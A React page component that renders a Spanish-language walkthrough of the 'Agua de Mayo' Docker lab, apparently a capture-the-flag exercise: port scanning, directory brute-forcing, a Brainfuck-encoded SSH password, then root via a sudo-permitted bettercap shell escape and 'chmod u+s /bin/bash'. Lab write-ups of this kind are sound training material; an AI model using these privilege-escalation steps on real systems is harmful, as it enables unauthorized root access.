import CodeBash from "@/components/CodeBash";
import labs from "../labs";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { ChevronDown, Slash } from "lucide-react";
import { Link } from "react-router-dom";
function AguaDeMayo() {
  const lastPath = location.pathname.split("/").filter(Boolean).pop();
  return (
    <div>
      <Breadcrumb>
        <BreadcrumbList>
          <BreadcrumbItem>
            <Link to="/">Home</Link>
          </BreadcrumbItem>
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <DropdownMenu>
              <DropdownMenuTrigger className="flex items-center gap-1">
                Docker Labs
                <ChevronDown className="h-4 w-4" />
              </DropdownMenuTrigger>
              <DropdownMenuContent align="start">
                {labs.map((lab) => (
                  <Link
                    to={
                      "/docker-labs/" + lab.toLowerCase().split(" ").join("-")
                    }
                  >
                    <DropdownMenuItem key={lab}>{lab}</DropdownMenuItem>
                  </Link>
                ))}
              </DropdownMenuContent>
            </DropdownMenu>
          </BreadcrumbItem>{" "}
          <BreadcrumbSeparator>
            <Slash />
          </BreadcrumbSeparator>
          <BreadcrumbItem>
            <BreadcrumbPage className="text-primary">
              {lastPath!.at(0)!.toUpperCase() +
                lastPath!.substring(1).split("-").join(" ")}
            </BreadcrumbPage>
          </BreadcrumbItem>
        </BreadcrumbList>
      </Breadcrumb>
      <div className="flex items-center flex-col">
        <h1 className="text-5xl mt-3 mb-5 font-bold">Agua de Mayo</h1>
        <div className="md:px-48 w-full">
          <h2 className="my-2 text-3xl font-bold">
            Comenzamos inicializando la maquina
          </h2>
          <CodeBash text="sudo bash auto_deploy.sh aguademayo.tar" />
          <h2 className="mt-5  mb-2 text-3xl font-bold">Escaneo de puertos</h2>
          <p>Vamos a empezar el escaneo de puertos usando nmap</p>
          <CodeBash text="nmap -p- --open 172.17.0.2 -Pn" />
          <p>Este es el resultado del escaneo</p>
          <CodeBash
            text="PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http"
          />
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Explorando el puerto 80
          </h2>
          <p>
            Parece ser una pagina generada por apache, nada fuera de lo comun,
            aremos un analisis con feroxbuster, el comando a usar es:
          </p>
          <CodeBash text="feroxbuster -u http://172.17.0.2:80 -t 500 -w /usr/share/wordlists/rockyou.txt -g" />
          <p>En uno de los resultados encontramos lo siguiente</p>
          <CodeBash
            text="301      GET        9l       28w      309c http://172.17.0.2/images => http://172.17.0.2/images/
200      GET      215l      927w    91172c http://172.17.0.2/images/agua_ssh.jpg
400      GET       10l       35w      302c http://172.17.0.2/100%real
200      GET      521l      936w    11142c http://172.17.0.2/?????"
          />
          <p>
            Hay una imagen llamada agua_ssh pero no parece tener nada
            interesante
          </p>
          <p>
            Regresando a apache revisamos el codigo fuente de la pagina y
            encontramos en la parte final algo raro
          </p>
          <CodeBash text="++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>." />
          <p>Lo busque en internet y parece ser brainfuck, </p>
          <p>
            En la pagina{" "}
            <a href="https://www.dcode.fr/brainfuck-language">Brainfuck</a> lo
            desencripte y el resultado fue este: bebeaguaqueessano
          </p>
          <p>
            Entonces probaremos la conexion a ssh usando agua como usuario y ese
            codigo que encontramos como contraseña
          </p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">Conexion a ssh</h2>
          <CodeBash text="sudo ssh agua@172.17.0.2" />
          <p>Y ya estamos dentro!</p>
          <h2 className="mt-5  mb-2 text-3xl font-bold">
            Escalado de privilegios
          </h2>
          <p>Exploramos el entorno un poco... y con el comando: </p>
          <CodeBash text="sudo -l" />
          <p>Cuyo resultado es: </p>
          <CodeBash
            text="Matching Defaults entries for agua on 1d97feb9af6f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User agua may run the following commands on 1d97feb9af6f:
    (root) NOPASSWD: /usr/bin/bettercap"
          />
          <p>
            Nos damos cuenta que podemos usar bettercap como root sin usar
            contraseña, para esto usamos el comando
          </p>
          <CodeBash text="sudo -u root /usr/bin/bettercap" />
          <p>Y se nos abrio una terminarl rara</p>
          <CodeBash
            text={`bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

172.17.0.0/16 > 172.17.0.2  » [04:30:27] [sys.log] [war] exec: "ip": executable file not found in $PATH
172.17.0.0/16 > 172.17.0.2  »`}
          />
          <p>Escribimos help para ver que opciones podemos usar</p>
          <CodeBash
            text="172.17.0.0/16 > 172.17.0.2  » help

           help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address."
          />
          <p>
            Vemos que podemos usar un ! paara hacer comandos de la shell,
            entonces activaremos el bit SUID (Set User ID), que hace que un
            archivo se ejecute con los permisos del propietario del archivo y no
            de quien lo ejecuta, entonces modificaremos los permisos de bash
          </p>
          <CodeBash text="! chmod u+s /bin/bash" />
          <p>
            Salimos del editor con exit y abrimos una instancia nueva de bash
          </p>
          <CodeBash text="bash -p" />
          <p>
            El -p es para quitar las restricciones que tiene bash cuando un
            usuario cambia de identidad permitiendonos que bash funcione con
            todos los privilegios de root
          </p>
          <p>Y eso es todo!!!! Conseguimos acceso root en la maquina</p>
          <CodeBash
            text="bash-5.2# whoami
root
bash-5.2#"
          />
        </div>
      </div>
    </div>
  );
}

export default AguaDeMayo;
